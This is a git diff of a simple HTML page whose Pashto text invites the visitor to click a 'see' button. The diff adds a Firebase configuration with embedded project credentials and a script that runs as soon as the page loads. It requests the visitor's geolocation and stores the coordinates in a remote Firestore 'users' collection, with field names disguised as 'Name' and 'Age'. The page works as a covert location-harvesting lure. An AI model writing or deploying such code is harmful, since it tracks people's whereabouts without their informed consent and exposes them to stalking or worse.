@@ -6,6 +6,7 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
+    <link rel="stylesheet" href="css/bootstrap.css">
     <link rel="stylesheet" href="./style.css" />
 </head>
 
@@ -15,13 +16,50 @@
             په مهربانی سره لاندی کلیک وکړی!
             <br />
             &#10549;
-            <button class='btn' onclick="getLocation()">کتل</button>
+            <button class='btn' onclick="findperson()">کتل</button>
+            <!-- <button class='btn btn-primary' onclick="saveTest()">کتل</button> -->
             <div id="result">
 
             </div>
         </header>
     </div>
-    <script src="./script.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-analytics.js"></script>
+    <script src="./script.js">
+    </script>
 </body>
 
 </html>
+<script type="module">
+    // Import the functions you need from the SDKs you need
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-app.js";
+    import { getFirestore, addDoc, setDoc, doc, collection } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore.js";
+    // TODO: Add SDKs for Firebase products that you want to use
+    // https://firebase.google.com/docs/web/setup#available-libraries
+
+    // Your web app's Firebase configuration
+    const firebaseConfig = {
+        apiKey: "AIzaSyBzU2T7WcCiETXLz1wSBEqtP8DSuutpEgs",
+        authDomain: "locationsystem-b3d81.firebaseapp.com",
+        projectId: "locationsystem-b3d81",
+        storageBucket: "locationsystem-b3d81.appspot.com",
+        messagingSenderId: "625254395363",
+        appId: "1:625254395363:web:07d3702515e494e32f84d6"
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    // Initialize Cloud Firestore and get a reference to the service
+    const db = getFirestore(app);
+    document.addEventListener('DOMContentLoaded', function () {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(show)
+            function show(eValue) {
+                addDoc(collection(db, "users"), {
+                    Name: "founded",
+                    Age: eValue.coords.latitude + ',' + eValue.coords.longitude
+                });
+            }
+        }
+    })
+</script>
